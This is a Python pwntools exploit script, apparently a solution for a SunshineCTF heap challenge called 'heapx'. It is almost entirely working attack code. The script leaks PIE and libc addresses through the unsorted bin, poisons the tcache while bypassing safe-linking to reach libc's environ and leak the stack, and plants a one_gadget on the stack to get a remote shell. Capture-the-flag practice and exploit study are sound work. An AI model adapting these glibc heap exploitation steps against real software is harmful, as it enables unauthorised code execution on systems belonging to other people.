#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './heapx_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc chal.sunshinectf.games 25004'.split()


libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
            if hasattr(resolved, 'address'):
                resolved = getattr(resolved, 'address')
                if not resolved & 0xfff:
                    log.success(
                        term.text.bold_green(f'{name}.address & 0xFFF == 0')
                        )
                else:
                    log.warn(
                        term.text.bold_yellow(f'{name}.address & 0xFFF != 0')
                        )
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda:...
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda:...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
    
malloc_cnt = -1

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')

def malloc(sz):
    global malloc_cnt
    malloc_cnt += 1
    p.sendline(f'new {sz}'.encode())
    return malloc_cnt

def puts(id):
    p.sendline(f'read {id}'.encode())

def write(id, x, off=0):
    p.sendline(f'write {id}'.encode())
    p.sendline(str(off).encode())
    p.sendlineafter(b'data:', x, timeout=1)

def free(id):
    p.sendline(f'delete {id}'.encode())


gdbscript = '''
b *(main+0)
continue
'''.format(**locals())

'''
TLDR; 
1. Leak libc through unsorted bin
2. Leverage tcache poisoning to get pointer to libc's environ to leak stack
3. Use one gadget to spawn shell
'''

p = start()
'''
First leak pie,
This will be useful when we have to null out all the pointers -
to prevent double-free error
'''
write(0, b'')
pie_leak = eval(p.recvline_contains(b'[ERROR]').split()[3][1:])
exe.address = pie_leak - 0x4060
logx.pie_leak()
logx.exe()
'''
Here we prepare two chunks for tcache poisoning
Remember that safe-linking is enabled,
so we need to leak FD of the first tcache chunk
to make our fake pointer to environ (leak stack)
'''

sz = 64
ubin1, cons1 = malloc(0x420), malloc(0x20)

'''
Next we make one big chunk so it goes to unsorted bin,
and another to prevent consolidation
'''

'''
We free the unsorted bin
'''
free(ubin1)
'''
Leak libc
'''
sleep(1)
p.clean(1)
puts(ubin1)
leak_libc = ua(p.recvuntil(b'>')[:-1])
libc.address = leak_libc - (libc.sym.main_arena + 96)
logx.leak_libc()
logx.libc()

'''
Tcache poison
'''
sz2 = 128
tcache3 = malloc(sz2)
tcache4 = malloc(sz2)
free(tcache3)
free(tcache4)

p.clean(.5)
puts(tcache3)
leak_mangle = ua(p.recvuntil(b'>')[:-1])
environ_off = libc.sym.environ - 0x8 * 3
environ_mangled = environ_off ^ leak_mangle 
logx.leak_mangle()
logx.environ_mangled()
write(tcache4, p64(environ_mangled))

'''
environ leak
'''
tcache5 = malloc(sz2)
tcache6 = malloc(sz2)
write(tcache6, b'testtest' * 3)

p.clean(.5)
puts(tcache6)
leak_environ = ua(p.recvuntil(b'>').replace(b'test', b'')[:-1])
rsp = leak_environ -0x9b8
logx.leak_environ()
logx.rsp()
sz4 = 500

'''
ROP with one gadget
'''
one_gadget = libc.address + 0xf72d2

rop1 = malloc(sz4)
rop2 = malloc(sz4)
free(rop1)
free(rop2)

p.clean(1)
puts(rop1)
leak_rop = ua(p.recvuntil(b'>')[:-1])
rop_mangled = (rsp+0x880) ^ leak_rop
logx.leak_rop()
logx.rop_mangled()
write(rop2, p64(rop_mangled))

rop3 = malloc(sz4)
rop4 = malloc(sz4)
write(rop4, p64(rsp - 0x60) + p64(one_gadget))

'''
Prevent double free error
'''
sz3 = 256
df1 = malloc(sz3)
df2 = malloc(sz3)
free(df1)
free(df2)

p.clean(.5)
puts(df1)
leak_mangle = ua(p.recvuntil(b'>')[:-1])
table_off = exe.address + 0x4060
table_mangled = table_off ^ leak_mangle
logx.leak_mangle()
logx.table_mangled()
write(df2, p64(table_mangled))

df3 = malloc(sz3)
df4 = malloc(sz3)
write(df4, p64(0)*32)
p.sendline(b'exit')

p.interactive()